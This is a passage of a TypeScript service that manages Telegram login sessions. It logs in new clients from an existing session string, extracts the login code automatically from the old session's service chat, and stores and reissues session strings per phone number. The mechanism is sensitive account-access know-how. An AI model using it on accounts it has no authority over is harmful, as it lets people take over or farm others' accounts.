SessionManager.instance = new SessionManager();\r\n        }\r\n        return SessionManager.instance;\r\n    }\r\n\r\n    /**\r\n     * Main entry point for session creation with fallback strategies\r\n     */\r\n    public async createSession(options: SessionCreationOptions): Promise<SessionCreationResult> {\r\n        const { mobile, oldSession, password = this.DEFAULT_PASSWORD } = options;\r\n\r\n        // Validate mobile parameter\r\n        if (!mobile) {\r\n            return { success: false, error: 'Mobile number is required', retryable: false };\r\n        }\r\n\r\n        this.logger.info(mobile, 'Starting session creation process with priority order');\r\n\r\n        // Check for existing sessions\r\n        const existingCheck = this.checkExistingSession(mobile);\r\n        if (!existingCheck.canProceed) {\r\n            return existingCheck.result;\r\n        }\r\n\r\n        // Try strategies in priority order: 1. Old session -> 2. Existing manager\r\n        const strategies = this.getCreationStrategies(options);\r\n\r\n        this.logger.info(mobile, `Available strategies: ${strategies.map(s => s.strategyName).join(', ')}`);\r\n\r\n        for (const strategy of strategies) {\r\n            try {\r\n                this.logger.info(mobile, `Attempting strategy: ${strategy.strategyName}`);\r\n                const result = await strategy();\r\n                if (result.success) {\r\n                    this.logger.info(mobile, ` Session creation successful with ${strategy.strategyName}`);\r\n                    return result;\r\n                }\r\n                this.logger.info(mobile, ` Strategy ${strategy.strategyName} failed: ${result.error}`);\r\n            } catch (error) {\r\n                this.logger.error(mobile, ` Strategy ${strategy.strategyName} threw error`, error);\r\n            }\r\n        }\r\n\r\n        return { success: false, error: 'All SessionManager strategies failed', retryable: false };\r\n    }\r\n\r\n    /**\r\n     * Check if session creation can proceed\r\n     */\r\n    private checkExistingSession(mobile: string): { canProceed: boolean; result?: SessionCreationResult } {\r\n        // Validate mobile parameter\r\n        if (!mobile || typeof mobile !== 'string') {\r\n            return {\r\n                canProceed: false,\r\n                result: { success: false, error: 'Invalid mobile number provided', retryable: false }\r\n            };\r\n        }\r\n\r\n        if (this.clientRegistry.hasClient(mobile)) {\r\n            const clientInfo = this.clientRegistry.getClientInfo(mobile);\r\n            if (clientInfo?.isCreating) {\r\n                return {\r\n                    canProceed: false,\r\n                    result: { success: false, error: 'Session creation already in progress', retryable: true }\r\n                };\r\n            }\r\n            return {\r\n                canProceed: false,\r\n                result: { success: false, error: 'Active session exists. Use cleanup first.', retryable: false }\r\n            };\r\n        }\r\n        return { canProceed: true };\r\n    }\r\n\r\n    /**\r\n     * Get creation strategies in priority order\r\n     * Priority: 1. Old session -> 2. Existing manager -> 3. Audit sessions (handled at service level)\r\n     */\r\n    private getCreationStrategies(options: SessionCreationOptions) {\r\n        const strategies = [];\r\n\r\n        // Strategy 1: Use old session if provided (HIGHEST PRIORITY)\r\n        if (options.oldSession) {\r\n            const strategyFunction = () => this.createFromOldSession(options);\r\n            strategyFunction.strategyName = 'oldSession';\r\n            strategies.push(strategyFunction);\r\n        }\r\n\r\n        // Strategy 2: Use existing TelegramManager (SECOND PRIORITY)\r\n        if (options.mobile) {\r\n            const strategyFunction = () => this.createFromExistingManager(options.mobile);\r\n            strategyFunction.strategyName = 'existingManager';\r\n            strategies.push(strategyFunction);\r\n        }\r\n\r\n        return strategies;\r\n    }\r\n\r\n    /**\r\n     * Create session from old session string\r\n     */\r\n    private async createFromOldSession(options: SessionCreationOptions): Promise<SessionCreationResult> {\r\n        const { oldSession, mobile, password, maxRetries = this.DEFAULT_MAX_RETRIES, retryDelay = this.DEFAULT_RETRY_DELAY } = options;\r\n\r\n        // Validate old session first\r\n        const validation = await this.validateSession(oldSession!, mobile);\r\n        if (!validation.isValid) {\r\n            return { success: false, error: `Session validation failed: ${validation.error}`, retryable: false };\r\n        }\r\n\r\n        // Acquire lock\r\n        const lockId = await this.clientRegistry.waitForLock(mobile);\r\n\r\n        try {\r\n            this.clientRegistry.markClientCreating(mobile, lockId);\r\n\r\n            for (let attempt = 1; attempt <= maxRetries; attempt++) {\r\n                try {\r\n                    const newSession = await this.performSessionCreation(oldSession!, mobile, password!, attempt);\r\n                    return { success: true, session: newSession };\r\n                } catch (error) {\r\n                    const errorMessage = error.message || error.toString();\r\n                    const isRetryable = this.isRetryableError(errorMessage);\r\n\r\n                    if (!isRetryable || attempt === maxRetries) {\r\n                        return { success: false, error: errorMessage, retryable: isRetryable };\r\n                    }\r\n\r\n                    if (attempt < maxRetries) {\r\n                        await sleep(retryDelay);\r\n                    }\r\n                }\r\n            }\r\n\r\n            return { success: false, error: 'Max retries exceeded', retryable: false };\r\n\r\n        } finally {\r\n            if (lockId) {\r\n                await this.clientRegistry.removeClient(mobile, lockId);\r\n                this.clientRegistry.releaseLock(mobile, lockId);\r\n            }\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Create session using existing TelegramManager\r\n     */\r\n    private async createFromExistingManager(mobile: string): Promise<SessionCreationResult> {\r\n        try {\r\n            const client = await connectionManager.getClient(mobile);\r\n            const newSession = await client.createNewSession();\r\n            return { success: true, session: newSession };\r\n        } catch (error) {\r\n            return {\r\n                success: false,\r\n                error: error.message || 'Existing manager method failed',\r\n                retryable: this.isRetryableError(error.message)\r\n            };\r\n        } finally {\r\n            await connectionManager.unregisterClient(mobile);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Validate session functionality\r\n     */\r\n    public async validateSession(sessionString: string, mobile: string): Promise<{ isValid: boolean; error?: string; userInfo?: Api.User }> {\r\n        let tempClient: TelegramClient | null = null;\r\n\r\n        try {\r\n            tempClient = new TelegramClient(\r\n                new StringSession(sessionString),\r\n                this.getApiId(),\r\n                this.getApiHash(),\r\n                { connectionRetries: 1 }\r\n            );\r\n\r\n            await tempClient.connect();\r\n            const userInfo = await tempClient.getMe() as Api.User;\r\n\r\n            if (!userInfo || userInfo.phone !== mobile) {\r\n                return { isValid: false, error: 'Phone number mismatch or invalid user info' };\r\n            }\r\n            this.logger.info(mobile, 'Session validation successful');\r\n            await this.cleanupClient(tempClient, mobile);\r\n            return { isValid: true, userInfo };\r\n        } catch (error) {\r\n            this.logger.error(mobile, 'Session validation failed', error);\r\n            await this.cleanupClient(tempClient, mobile);\r\n            return { isValid: false, error: error.message || error.toString() || error.errorMessage };\r\n        } finally {\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Perform the actual session creation\r\n     */\r\n    private async performSessionCreation(oldSessionString: string, mobile: string, password: string, attempt: number): Promise<string> {\r\n        let oldClient: TelegramClient | null = null;\r\n        let newClient: TelegramClient | null = null;\r\n\r\n        try {\r\n            // Connect to old session\r\n            oldClient = new TelegramClient(\r\n                new StringSession(oldSessionString),\r\n                this.getApiId(),\r\n                this.getApiHash(),\r\n                { connectionRetries: 1 }\r\n            );\r\n\r\n            await oldClient.connect();\r\n            await oldClient.getMe(); // Verify connection\r\n\r\n            // Create new client\r\n            newClient = new TelegramClient(\r\n                new StringSession(''),\r\n                this.getApiId(),\r\n                this.getApiHash(),\r\n                { connectionRetries: 1 }\r\n            );\r\n\r\n            // Start session creation\r\n            await newClient.start({\r\n                phoneNumber: mobile,\r\n                password: async () => password,\r\n                phoneCode: async () => this.waitForOtp(oldClient!, mobile, attempt),\r\n                onError: (err: any) => {\r\n                    throw new Error(`Session start error: ${err.message || err}`);\r\n                }\r\n            });\r\n\r\n            return newClient.session.save() as unknown as string;\r\n\r\n        } finally {\r\n            await Promise.all([\r\n                this.cleanupClient(newClient, mobile),\r\n                this.cleanupClient(oldClient, mobile)\r\n            ]);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Wait for OTP from Telegram (chat ID 777000)\r\n     */\r\n    private async waitForOtp(oldClient: TelegramClient, mobile: string, attempt: number): Promise<string> {\r\n        const startTime = Date.now();\r\n\r\n        this.logger.info(mobile, `Waiting for OTP (attempt ${attempt})`);\r\n\r\n        while (Date.now() - startTime < this.OTP_WAIT_TIME) {\r\n            try {\r\n                const messages = await oldClient.getMessages('777000', { limit: 1 });\r\n                const message = messages[0];\r\n\r\n                if (message && message.date && (message.date * 1000) > (Date.now() - 120000)) {\r\n                    // Safely check if message has text before processing\r\n                    const messageText = message.text || message.message || '';\r\n                    if (messageText) {\r\n                        const code = this.extractOtpCode(messageText.toLowerCase());\r\n                        if (code) {\r\n                            this.logger.info(mobile, `OTP extracted: ${code}`);\r\n                            return code;\r\n                        }\r\n                    }\r\n                }\r\n\r\n                await sleep(this.OTP_CHECK_INTERVAL);\r\n\r\n            } catch (error) {\r\n                this.logger.error(mobile, 'Error checking OTP messages', error);\r\n                await sleep(this.OTP_CHECK_INTERVAL);\r\n            }\r\n        }\r\n\r\n        throw new Error(`OTP timeout after ${this.OTP_WAIT_TIME}ms`);\r\n    }\r\n\r\n    /**\r\n     * Extract OTP code from message text\r\n     */\r\n    private extractOtpCode(messageText: string): string | null {\r\n        const patterns = [\r\n            /code:\\*\\*(\\d{5,6})/,\r\n            /login code:\\s*(\\d{5,6})/,\r\n            /your code is\\s*(\\d{5,6})/,\r\n            /verification code:\\s*(\\d{5,6})/,\r\n            /\\b(\\d{5,6})\\b/\r\n        ];\r\n\r\n        for (const pattern of patterns) {\r\n            const match = messageText.match(pattern);\r\n            if (match) return match[1];\r\n        }\r\n\r\n        return null;\r\n    }\r\n\r\n    /**\r\n     * Clean up Telegram client with enhanced safety\r\n     */\r\n    private async cleanupClient(client: TelegramClient | null, mobile: string): Promise<void> {\r\n        if (!client) return;\r\n        try {\r\n            // Check if client is already destroyed to prevent double cleanup\r\n            if ((client as any)._destroyed) {\r\n                this.logger.info(mobile, 'Client already destroyed, skipping cleanup');\r\n                return;\r\n            }\r\n\r\n            await client.destroy();\r\n\r\n            // Safely handle private properties that might not exist\r\n            if ((client as any)._eventBuilders) {\r\n                (client as any)._eventBuilders = [];\r\n            }\r\n\r\n            connectionManager.unregisterClient(mobile);\r\n            await sleep(1000);\r\n        } catch (error) {\r\n            this.logger.error(mobile, 'Client cleanup error', error);\r\n        } finally {\r\n            if (client) {\r\n                try {\r\n                    (client as any)._destroyed = true;\r\n                    if ((client as any)._sender && typeof (client as any)._sender.disconnect === 'function') {\r\n                        await (client as any)._sender.disconnect().catch(() => { });\r\n                    }\r\n                } catch (finalCleanupError) {\r\n                    this.logger.error(mobile, 'Final cleanup error', finalCleanupError);\r\n                }\r\n                this.logger.info(mobile, 'Client cleanup completed');\r\n            }\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Check if error is retryable\r\n     */\r\n    private isRetryableError(errorMessage: string): boolean {\r\n        const nonRetryableErrors = [\r\n            'user_deactivated_ban', 'auth_key_unregistered', 'session_revoked',\r\n            'phone_number_banned', 'user_deactivated', 'phone_number_invalid',\r\n            'session_password_needed'\r\n        ];\r\n\r\n        const retryableErrors = [\r\n            'timeout', 'network_error', 'connection_error', 'flood_wait', 'internal_server_error'\r\n        ];\r\n\r\n        const lowerErrorMessage = errorMessage.toLowerCase();\r\n\r\n        if (nonRetryableErrors.some(error => lowerErrorMessage.includes(error))) {\r\n            return false;\r\n        }\r\n\r\n        if (retryableErrors.some(error => lowerErrorMessage.includes(error))) {\r\n            return true;\r\n        }\r\n\r\n        return true; // Default to retryable for unknown errors\r\n    }\r\n\r\n    /**\r\n     * Get session status\r\n     */\r\n    public getSessionStatus(mobile: string): {\r\n        status: 'active' | 'inactive' | 'creating' | 'error';\r\n        activeClients: number;\r\n        lastActivity?: Date;\r\n    } {\r\n        const clientInfo = this.clientRegistry.getClientInfo(mobile);\r\n\r\n        if (!clientInfo) {\r\n            return { status: 'inactive', activeClients: 0 };\r\n        }\r\n\r\n        return {\r\n            status: clientInfo.isCreating ? 'creating' : 'active',\r\n            activeClients: 1,\r\n            lastActivity: clientInfo.lastActivity\r\n        };\r\n    }\r\n\r\n    /**\r\n     * Cleanup sessions\r\n     */\r\n    public async cleanupSessions(mobile: string, force: boolean = false): Promise<{\r\n        success: boolean;\r\n        cleanedCount: number;\r\n        error?: string;\r\n    }> {\r\n        try {\r\n            const clientInfo = this.clientRegistry.getClientInfo(mobile);\r\n\r\n            if (!clientInfo) {\r\n                return { success: true, cleanedCount: 0 };\r\n            }\r\n\r\n            if (clientInfo.isCreating && !force) {\r\n                return {\r\n                    success: false,\r\n                    cleanedCount: 0,\r\n                    error: 'Session creation in progress. Use force=true to cleanup anyway.'\r\n                };\r\n            }\r\n\r\n            const cleanedCount = await this.clientRegistry.forceCleanup(mobile);\r\n            return { success: true, cleanedCount };\r\n\r\n        } catch (error) {\r\n            return {\r\n                success: false,\r\n                cleanedCount: 0,\r\n                error: error.message || 'Cleanup failed'\r\n            };\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Get registry statistics\r\n     */\r\n    public getRegistryStats(): { activeClients: number; activeLocks: number; mobiles: string[] } {\r\n        return this.clientRegistry.getStats();\r\n    }\r\n}\r\n\r\n@Injectable()\r\nexport class SessionService {\r\n\r\n    private readonly logger = new TelegramLogger('SessionService');\r\n    private readonly sessionManager = SessionManager.getInstance();\r\n    private readonly sessionAuditService: SessionAuditService;\r\n    private readonly rateLimitMap = new Map<string, { count: number; resetTime: number }>();\r\n    private readonly MAX_SESSIONS_PER_HOUR = 20;\r\n    private readonly RATE_LIMIT_WINDOW = 3600000; // 1 hour\r\n\r\n    constructor(sessionAuditService: SessionAuditService) {\r\n        this.sessionAuditService = sessionAuditService;\r\n    }\r\n\r\n    private getApiId(): number {\r\n        const apiId = process.env.API_ID;\r\n        if (!apiId) {\r\n            throw new Error('API_ID environment variable is required');\r\n        }\r\n        const parsedApiId = parseInt(apiId);\r\n        if (isNaN(parsedApiId)) {\r\n            throw new Error('Invalid API_ID: must be a number');\r\n        }\r\n        return parsedApiId;\r\n    }\r\n\r\n    private getApiHash(): string {\r\n        const apiHash = process.env.API_HASH;\r\n        if (!apiHash) {\r\n            throw new Error('API_HASH environment variable is required');\r\n        }\r\n        return apiHash;\r\n    }\r\n\r\n    private checkRateLimit(mobile: string): { allowed: boolean; resetTime?: number } {\r\n        const now = Date.now();\r\n        const rateLimit = this.rateLimitMap.get(mobile);\r\n\r\n        // Clean up expired rate limit entries\r\n        if (rateLimit && now > rateLimit.resetTime) {\r\n            this.rateLimitMap.delete(mobile);\r\n        }\r\n\r\n        const currentLimit = this.rateLimitMap.get(mobile);\r\n\r\n        if (!currentLimit) {\r\n            this.rateLimitMap.set(mobile, { count: 1, resetTime: now + this.RATE_LIMIT_WINDOW });\r\n            return { allowed: true };\r\n        }\r\n\r\n        if (currentLimit.count >= this.MAX_SESSIONS_PER_HOUR) {\r\n            return { allowed: false, resetTime: currentLimit.resetTime };\r\n        }\r\n\r\n        currentLimit.count++;\r\n        return { allowed: true };\r\n    }\r\n\r\n    private async extractMobileFromSession(sessionString: string): Promise<{ mobile?: string; error?: string }> {\r\n        let tempClient: TelegramClient | null = null;\r\n\r\n        try {\r\n            tempClient = new TelegramClient(\r\n                new StringSession(sessionString),\r\n                this.getApiId(),\r\n                this.getApiHash(),\r\n                { connectionRetries: 1 }\r\n            );\r\n\r\n            await tempClient.connect();\r\n            const userInfo = await tempClient.getMe() as Api.User;\r\n\r\n            if (!userInfo || !userInfo.phone) {\r\n                return { error: 'Unable to extract phone number from session' };\r\n            }\r\n\r\n            return { mobile: userInfo.phone };\r\n\r\n        } catch (error) {\r\n            return { error: error.message || error.toString() };\r\n        } finally {\r\n            if (tempClient) {\r\n                try {\r\n                    await tempClient.destroy();\r\n                    tempClient._eventBuilders = [];\r\n                    await sleep(1000);\r\n                } catch (cleanupError) {\r\n                } finally {\r\n                    if (tempClient) {\r\n                        tempClient._destroyed = true;\r\n                        if (tempClient._sender && typeof tempClient._sender.disconnect === 'function') {\r\n                            await tempClient._sender.disconnect().catch(() => { });\r\n                        }\r\n                    }\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    async createSession(options: SessionCreationOptions): Promise<SessionCreationResult> {\r\n        // Validate input parameters\r\n        if (!options || typeof options !== 'object') {\r\n            return { success: false, error: 'Invalid options provided', retryable: false };\r\n        }\r\n\r\n        let mobile = options.mobile;\r\n\r\n        if (!mobile && options.oldSession) {\r\n            try {\r\n                const extractResult = await this.extractMobileFromSession(options.oldSession);\r\n                if (extractResult.error) {\r\n                    return { success: false, error: `Failed to extract mobile from session: ${extractResult.error}`, retryable: false };\r\n                }\r\n                mobile = extractResult.mobile!;\r\n                options.mobile = mobile;\r\n            } catch (error) {\r\n                return { success: false, error: `Error extracting mobile from session: ${error.message}`, retryable: false };\r\n            }\r\n        }\r\n\r\n        this.logger.info(mobile || 'unknown', 'Service: Creating session with priority order: 1.Old Session -> 2.Existing Manager -> 3.Audit Sessions');\r\n\r\n        if (!mobile || typeof mobile !== 'string') {\r\n            return { success: false, error: 'Mobile number is required or must be extractable from session', retryable: false };\r\n        }\r\n\r\n        // Check rate limit\r\n        const rateLimitCheck = this.checkRateLimit(mobile);\r\n        if (!rateLimitCheck.allowed) {\r\n            const resetTime = new Date(rateLimitCheck.resetTime || 0);\r\n            return {\r\n                success: false,\r\n                error: `Rate limit exceeded. Try again after ${resetTime.toISOString()}`,\r\n                retryable: true\r\n            };\r\n        }\r\n\r\n        try {\r\n            if (options.oldSession) {\r\n                this.logger.info(mobile, 'Trying with provided old session (Priority 1)');\r\n                const result = await this.sessionManager.createSession(options);\r\n\r\n                if (result.success && result.session) {\r\n                    await this.updateAuditOnSuccess(mobile, result.session, SessionCreationMethod.INPUT_SESSION);\r\n                    return result;\r\n                } else {\r\n                    this.logger.info(mobile, `Old session failed: ${result.error}`);\r\n                }\r\n            }\r\n\r\n            // PRIORITY 2: Try with existing manager (mobile-based)\r\n            this.logger.info(mobile, 'Trying with existing manager (Priority 2)');\r\n            const managerResult = await this.sessionManager.createSession({\r\n                ...options,\r\n                oldSession: undefined // Clear old session to force using existing manager\r\n            });\r\n\r\n            if (managerResult.success && managerResult.session) {\r\n                await this.updateAuditOnSuccess(mobile, managerResult.session, SessionCreationMethod.USER_MOBILE);\r\n                return managerResult;\r\n            } else {\r\n                this.logger.info(mobile, `Existing manager failed: ${managerResult.error}`);\r\n            }\r\n\r\n            // PRIORITY 3: Try with audit sessions (fallback)\r\n            this.logger.info(mobile, 'Trying with audit sessions (Priority 3)');\r\n            const auditResult = await this.tryAuditSessions(mobile, options);\r\n            if (auditResult.success) {\r\n                await this.updateAuditOnSuccess(mobile, auditResult.session!, SessionCreationMethod.OLD_SESSION);\r\n                return auditResult;\r\n            } else {\r\n                this.logger.info(mobile, `Audit sessions failed: ${auditResult.error}`);\r\n            }\r\n\r\n            // All strategies failed\r\n            const finalError = 'All session creation strategies failed: old session, existing manager, and audit sessions';\r\n            this.logger.warn(mobile, finalError)\r\n            return {\r\n                success: false,\r\n                error: finalError,\r\n                retryable: false\r\n            };\r\n\r\n        } catch (error) {\r\n            parseError(error, `Error While generating new Session`);\r\n            return {\r\n                success: false,\r\n                error: error.message || 'Unexpected error',\r\n                retryable: false\r\n            };\r\n        }\r\n    }\r\n\r\n    private async tryAuditSessions(mobile: string, options: SessionCreationOptions): Promise<SessionCreationResult> {\r\n        try {\r\n            const auditSessions = await this.sessionAuditService.getSessionsFormobile(mobile, true);\r\n\r\n            if (!auditSessions || auditSessions.length === 0) {\r\n                return { success: false, error: 'No audit sessions found', retryable: false };\r\n            }\r\n\r\n            for (let i = 0; i < Math.min(auditSessions.length, 2); i++) {\r\n                const auditSession = auditSessions[i];\r\n\r\n                try {\r\n                    const result = await this.sessionManager.createSession({\r\n                        ...options,\r\n                        oldSession: auditSession.sessionString,\r\n                        maxRetries: 1\r\n                    });\r\n\r\n                    if (result.success) {\r\n                        // Don't mark session as used - let the main success handler create new audit record\r\n                        return result;\r\n                    }\r\n                } catch (error) {\r\n                    this.logger.error(mobile, `Audit session ${i + 1} failed`, error);\r\n                }\r\n            }\r\n\r\n            return { success: false, error: 'All audit sessions failed', retryable: false };\r\n\r\n        } catch (error) {\r\n            return { success: false, error: 'Failed to process audit sessions', retryable: false };\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Create new audit record on success (always create new, don't update existing)\r\n     */\r\n    private async updateAuditOnSuccess(mobile: string, sessionString: string, creationMethod: SessionCreationMethod): Promise<void> {\r\n        try {\r\n            // Always create a new audit record for successful session creation\r\n            await this.sessionAuditService.createAuditRecord({\r\n                mobile,\r\n                sessionString,\r\n                creationMethod,\r\n                creationMessage: 'Session created successfully'\r\n            });\r\n        } catch (error) {\r\n            this.logger.error(mobile, 'Failed to create new audit record on success', error);\r\n        }\r\n    }\r\n    async getSessionAuditHistory(mobile: string, options?: {\r\n        limit?: number;\r\n        offset?: number;\r\n        status?: SessionStatus;\r\n    }): Promise<{ success: boolean; data?: SessionAudit[]; total?: number; error?: string }> {\r\n        try {\r\n            const result = await this.sessionAuditService.querySessionAudits({\r\n                mobile,\r\n                limit: options?.limit,\r\n                offset: options?.offset,\r\n                status: options?.status\r\n            });\r\n\r\n            return { success: true, data: result.sessions, total: result.total };\r\n        } catch (error) {\r\n            return { success: false, error: error.message || 'Failed to get audit history' };\r\n        }\r\n    }\r\n\r\n    async getActiveSession(mobile: string): Promise<{ success: boolean; session?: SessionAudit; error?: string }> {\r\n        try {\r\n            const activeSession = await this.sessionAuditService.getLatestActiveSession(mobile);\r\n            return { success: true, session: activeSession || undefined };\r\n        } catch (error) {\r\n            return { success: false, error: error.message || 'Failed to get active session' };\r\n        }\r\n    }\r\n\r\n    async updateSessionLastUsed(mobile: string, sessionString?: string): Promise<{ success: boolean; error?: string }> {\r\n        try {\r\n            const result = await this.sessionAuditService.markSessionUsed(mobile, sessionString);\r\n            if (result) {\r\n                this.logger.info(mobile, 'Session last used timestamp updated');\r\n                return { success: true };\r\n            } else {\r\n                return { success: false, error: 'No active session found to update' };\r\n            }\r\n        } catch (error) {\r\n            return { success: false, error: error.message || 'Failed to update session last used timestamp' };\r\n        }\r\n    }\r\n\r\n    async findRecentValidSession(mobile: string): Promise<{ success: boolean; session?: SessionAudit; error?: string }> {\r\n        try {\r\n            // Validate mobile parameter\r\n            if (!mobile || typeof mobile !== 'string') {\r\n                return { success: false, error: 'Invalid mobile number provided' };\r\n            }\r\n\r\n            const recentSessions = await this.sessionAuditService.findRecentSessions(mobile);\r\n            this.logger.debug(mobile, `Found ${recentSessions?.length || 0} recent sessions for this month`);\r\n\r\n            if (!recentSessions || recentSessions.length === 0) {\r\n                this.logger.debug(mobile, 'No recent sessions found for this month');\r\n                return { success: false, error: 'No recent sessions found for this month' };\r\n            }\r\n\r\n            for (const session of recentSessions) {\r\n                if (session && session.sessionString) {\r\n                    return { success: true, session };\r\n                    // const isActive = await this.sessionManager.validateSession(session.sessionString, mobile);\r\n                    // if (isActive.isValid) {\r\n                    //     return { success: true, session };\r\n                    // } else {\r\n                    //     this.logger.debug(mobile, `Session found from this month but not valid: ${session}`);\r\n                    //     this.sessionAuditService.revokeSession(session.mobile, session.sessionString, isActive.error);\r\n                    // }\r\n                }\r\n            }\r\n\r\n            this.logger.debug(mobile, 'No valid session found from this month');\r\n            return { success: false, error: 'No valid session found from this month' };\r\n        } catch (error) {\r\n            this.logger.error(mobile, 'Failed to find valid session from this month', error);\r\n            return { success: false, error: error.message || 'Failed to find valid session from this month' };\r\n        }\r\n    }\r\n\r\n    async getOldestSessionOrCreate(options: {\r\n        mobile: string;\r\n        allowFallback?: boolean;\r\n        maxAgeDays?: number;\r\n    }): Promise<{\r\n        success: boolean;\r\n        message?: string;\r\n        data?: {\r\n            session: string;\r\n            sessionAge: number;\r\n            isNew: boolean;\r\n            usageCount: number;\r\n            lastUsedAt: string;\r\n            createdAt: string;\r\n        };\r\n        code?: string;\r\n        retryable?: boolean;\r\n    }> {\r\n        const { mobile, allowFallback = true, maxAgeDays = 180 } = options;\r\n\r\n        try {\r\n            // Validate input parameters\r\n            if (!mobile || typeof mobile !== 'string' || mobile.trim().length === 0) {\r\n                return {\r\n                    success: false,\r\n                    message: 'Mobile number is required and must be a valid non-empty string',\r\n                    code: 'INVALID_MOBILE'\r\n                };\r\n            }\r\n\r\n            // Validate maxAgeDays\r\n            if (maxAgeDays <= 0 || maxAgeDays > 365) {\r\n                return {\r\n                    success: false,\r\n                    message: 'maxAgeDays must be between 1 and 365 days',\r\n                    code: 'INVALID_MAX_AGE'\r\n                };\r\n            }\r\n\r\n            this.logger.info(mobile, `Starting getOldestSessionOrCreate with maxAge: ${maxAgeDays} days, fallback: ${allowFallback}`);\r\n\r\n            // Check rate limiting first\r\n            const rateLimitCheck = this.checkRateLimit(mobile);\r\n            if (!rateLimitCheck.allowed) {\r\n                const resetTime = new Date(rateLimitCheck.resetTime || 0);\r\n                return {\r\n                    success: false,\r\n                    message: `Rate limit exceeded. Maximum ${this.MAX_SESSIONS_PER_HOUR} requests per hour. Try again after ${resetTime.toISOString()}`,\r\n                    code: 'RATE_LIMIT_EXCEEDED',\r\n                    retryable: true\r\n                };\r\n            }\r\n\r\n            // Step 1: Try to find the oldest valid session within the specified age limit\r\n            const oldestSessionResult = await this.findOldestValidSession(mobile, maxAgeDays);\r\n\r\n            if (oldestSessionResult.success && oldestSessionResult.session) {\r\n                this.logger.info(mobile, 'Oldest valid session found, updating usage and returning');\r\n\r\n                // Update usage statistics\r\n                try {\r\n                    await this.sessionAuditService.markSessionUsed(mobile, oldestSessionResult.session.sessionString);\r\n                } catch (updateError) {\r\n                    this.logger.error(mobile, 'Warning: Failed to update session usage', updateError);\r\n                    // Continue execution even if usage update fails\r\n                }\r\n\r\n                const sessionAge = this.calculateSessionAge(oldestSessionResult.session.createdAt);\r\n\r\n                return {\r\n                    success: true,\r\n                    message: 'Oldest valid session retrieved successfully',\r\n                    data: {\r\n                        session: oldestSessionResult.session.sessionString!,\r\n                        sessionAge,\r\n                        isNew: false,\r\n                        usageCount: oldestSessionResult.session.usageCount,\r\n                        lastUsedAt: oldestSessionResult.session.lastUsedAt.toISOString(),\r\n                        createdAt: oldestSessionResult.session.createdAt.toISOString()\r\n                    }\r\n                };\r\n            }\r\n\r\n            // Step 2: No valid session found - check if fallback is allowed\r\n            if (!allowFallback) {\r\n                this.logger.info(mobile, 'No valid session found and fallback is disabled');\r\n                return {\r\n                    success: false,\r\n                    message: `No valid session found within ${maxAgeDays} days and fallback creation is disabled`,\r\n                    code: 'FALLBACK_DISABLED'\r\n                };\r\n            }\r\n\r\n            // Step 3: Create new session as fallback\r\n            this.logger.info(mobile, 'No valid session found, creating new session as fallback');\r\n\r\n            const createResult = await this.createSessionWithFallback(mobile);\r\n\r\n            if (createResult.success && createResult.session) {\r\n                return {\r\n                    success: true,\r\n                    message: 'No existing session found, new session created as fallback',\r\n                    data: {\r\n                        session: createResult.session,\r\n                        sessionAge: 0, // Brand new session\r\n                        isNew: true,\r\n                        usageCount: 0,\r\n                        lastUsedAt: new Date().toISOString(),\r\n                        createdAt: new Date().toISOString()\r\n                    }\r\n                };\r\n            } else {\r\n                this.logger.error(mobile, 'Failed to create fallback session', createResult.error);\r\n                return {\r\n                    success: false,\r\n                    message: `Failed to create fallback session: ${createResult.error}`,\r\n                    code: 'FALLBACK_CREATION_FAILED',\r\n                    retryable: createResult.retryable || false\r\n                };\r\n            }\r\n\r\n        } catch (error) {\r\n            this.logger.error(mobile, 'Unexpected error in getOldestSessionOrCreate', error);\r\n            return {\r\n                success: false,\r\n                message: 'An unexpected error occurred while processing the request',\r\n                code: 'INTERNAL_ERROR',\r\n                retryable: false\r\n            };\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Find the oldest valid session for a mobile within the specified age limit\r\n     */\r\n    private async findOldestValidSession(mobile: string, maxAgeDays: number): Promise<{\r\n        success: boolean;\r\n        session?: SessionAudit;\r\n        error?: string;\r\n    }> {\r\n        try {\r\n            // Calculate the cutoff date\r\n            const cutoffDate = new Date();\r\n            cutoffDate.setDate(cutoffDate.getDate() - maxAgeDays);\r\n\r\n            this.logger.info(mobile, `Searching for sessions newer than ${cutoffDate.toISOString()}`);\r\n\r\n            // Get all sessions for the mobile within the age limit, sorted by creation date (oldest first)\r\n            const sessions = await this.sessionAuditService.querySessionAudits({\r\n                mobile,\r\n                isActive: true,\r\n                startDate: cutoffDate,\r\n                limit: 50, // Reasonable limit to prevent performance issues\r\n                offset: 0\r\n            });\r\n\r\n            if (!sessions.sessions || sessions.sessions.length === 0) {\r\n                this.logger.info(mobile, 'No sessions found within the specified age limit');\r\n                return { success: false, error: 'No sessions found within age limit' };\r\n            }\r\n\r\n            // Filter and sort to get the oldest session that meets our criteria\r\n            const validSessions = sessions.sessions\r\n                .filter(session =>\r\n                    session &&\r\n                    session.sessionString &&\r\n                    typeof session.sessionString === 'string' &&\r\n                    session.sessionString.trim().length > 0 &&\r\n                    session.isActive === true &&\r\n                    (session.status === SessionStatus.ACTIVE || session.status === SessionStatus.CREATED)\r\n                )\r\n                .sort((a, b) => new Date(a.createdAt).getTime() - new Date(b.createdAt).getTime()); // Sort oldest first\r\n\r\n            if (validSessions.length === 0) {\r\n                this.logger.info(mobile, 'No valid sessions found (all sessions are invalid or empty)');\r\n                return { success: false, error: 'No valid sessions found' };\r\n            }\r\n\r\n            const oldestSession = validSessions[0];\r\n            this.logger.info(mobile, `Found oldest valid session created at ${oldestSession.createdAt}`);\r\n\r\n            // Optionally validate the session before returning (disabled for performance, can be enabled if needed)\r\n            // const validationResult = await this.sessionManager.validateSession(oldestSession.sessionString!, mobile);\r\n            // if (!validationResult.isValid) {\r\n            //     await this.sessionAuditService.revokeSession(mobile, oldestSession.sessionString!, `Validation failed: ${validationResult.error}`);\r\n            //     return { success: false, error: 'Session validation failed' };\r\n            // }\r\n\r\n            return { success: true, session: oldestSession };\r\n\r\n        } catch (error) {\r\n            this.logger.error(mobile, 'Error finding oldest valid session', error);\r\n            return { success: false, error: error.message || 'Failed to find oldest valid session' };\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Create a new session using existing session creation logic with all fallback strategies\r\n     */\r\n    private async 